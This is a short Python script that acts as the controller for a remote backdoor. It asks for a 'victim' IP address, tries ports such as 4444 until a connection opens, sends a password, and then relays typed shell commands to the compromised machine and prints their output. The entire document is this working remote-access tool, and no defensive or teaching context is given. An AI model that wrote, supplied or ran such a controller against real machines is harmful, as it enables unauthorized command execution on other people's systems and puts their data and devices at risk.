import socket
import subprocess

HOST_IP = input('Enter Victim IP Address: ')
REMOTE_HOST = HOST_IP
POTENTIAL_PORTS = [4444, 4200, 3600, 4000, 4400]
REMOTE_PORT = 0
port_found = False
i = 0
while port_found == False:
   try:
        REMOTE_PORT = POTENTIAL_PORTS[i]
        client = socket.socket()
        print("Starting Connection")
        client.connect((REMOTE_HOST, REMOTE_PORT))
        port_found = True
   except:
        print("Tried Port " + str(REMOTE_PORT))
        i+=1
escape = False
input_password = input('Enter Password: ')
client.send(input_password.encode())
status = client.recv(1024).decode()
print(status)
if status == "Incorrect Password...Closing Connection":
    client.close()
else:
    escape = True
        
        
        
while escape == True:
    command = input('Enter Command: ')
    while len(command) == 0:
      print("No input\n")
      command = input('Enter command: ')
    command = command.encode()
    client.send(command)
    print('Command sent')
    output = client.recv(1024)
    output = output.decode()
    if output == "Disconnecting":
        escape = False
        client.close()
    print(f"Output: {output}")
